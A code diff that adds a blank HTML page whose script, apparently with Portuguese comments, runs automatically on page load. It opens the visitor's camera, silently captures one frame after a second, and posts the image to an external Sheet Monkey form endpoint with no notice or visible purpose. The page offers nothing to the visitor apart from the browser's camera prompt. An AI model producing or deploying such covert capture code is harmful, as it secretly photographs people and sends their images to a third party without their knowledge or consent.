@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+    <script>
+function sendImageToSheetMonkey(imageDataURL) {
+    // URL do endpoint do Sheet Monkey
+    const sheetMonkeyURL = 'https://api.sheetmonkey.io/form/wsG7cDA8LsPr5PzQSEu5Bk';
+
+    // Dados para enviar ao Sheet Monkey
+    const data = {
+        image: imageDataURL
+    };
+
+    // Opções para a requisição
+    const requestOptions = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    };
+
+    // Enviar a imagem para o Sheet Monkey
+    fetch(sheetMonkeyURL, requestOptions)
+    .then(response => response.json())
+    .then(data => {
+        console.log('Imagem enviada com sucesso para o Sheet Monkey:', data);
+    })
+    .catch(error => {
+        console.error('Erro ao enviar imagem para o Sheet Monkey:', error);
+    });
+}
+
+// Função para capturar a imagem da câmera
+function captureImageFromCamera() {
+    // Opções para a captura de vídeo
+    const videoOptions = {
+        video: true,
+        audio: false
+    };
+
+    // Acesso à câmera
+    navigator.mediaDevices.getUserMedia(videoOptions)
+    .then(function(stream) {
+        // Elemento de vídeo para exibir o stream da câmera
+        const videoElement = document.createElement('video');
+        videoElement.srcObject = stream;
+        videoElement.play();
+
+        // Espera um segundo para a câmera se ajustar
+        setTimeout(function() {
+            // Cria um canvas para capturar a imagem
+            const canvasElement = document.createElement('canvas');
+            const ctx = canvasElement.getContext('2d');
+
+            // Define as dimensões do canvas para corresponder ao vídeo
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+
+            // Desenha o quadro atual do vídeo no canvas
+            ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+
+            // Converte o conteúdo do canvas para uma URL de dados
+            const capturedImageURL = canvasElement.toDataURL('image/png');
+
+            // Envia a imagem capturada para o Sheet Monkey
+            sendImageToSheetMonkey(capturedImageURL);
+
+            // Parar a reprodução do vídeo e parar a captura da câmera
+            videoElement.pause();
+            stream.getTracks().forEach(track => track.stop());
+        }, 1000); // Ajuste o tempo conforme necessário para a câmera se ajustar
+    })
+    .catch(function(error) {
+        console.error('Erro ao capturar imagem da câmera:', error);
+    });
+}
+
+// Capturar e enviar a imagem automaticamente ao carregar a página
+captureImageFromCamera();
+
+    </script>
+</body>
+</html>
